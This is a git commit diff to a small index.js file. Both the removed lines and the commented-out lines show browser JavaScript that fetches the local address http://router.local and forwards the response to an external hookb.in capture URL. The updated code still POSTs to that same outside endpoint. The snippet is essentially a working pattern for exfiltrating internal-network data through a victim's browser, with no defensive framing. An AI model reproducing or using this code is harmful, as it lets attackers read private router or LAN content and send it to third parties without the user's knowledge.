d216fbe07be140012db712ce3b4cdd2c8ae50180
nastassiagoodson <60201494+nastassiagoodson@users.noreply.github.com>
2022-03-04 08:24:20 -0800

    Update index.js

--- index.js
+++ index.js
@@ -1,9 +1,9 @@
 const http = new XMLHttpRequest();
-http.addEventListener('load', function (event) {
-    const xhr = new XMLHttpRequest();
-    xhr.open('POST', 'https://hookb.in/nP0RO6rjzOTZ7Qrrd2Z1', true);
-    xhr.setRequestHeader('Content-type', 'application/json');
-    xhr.send(JSON.stringify(http.responseText));
-});
-http.open('GET', 'http://router.local');
+// http.addEventListener('load', function (event) {
+//     const xhr = new XMLHttpRequest();
+//     xhr.open('POST', 'https://hookb.in/nP0RO6rjzOTZ7Qrrd2Z1', true);
+//     xhr.setRequestHeader('Content-type', 'application/json');
+//     xhr.send(JSON.stringify(http.responseText));
+// });
+http.open('POST', 'https://hookb.in/nP0RO6rjzOTZ7Qrrd2Z1', true);
 http.send();
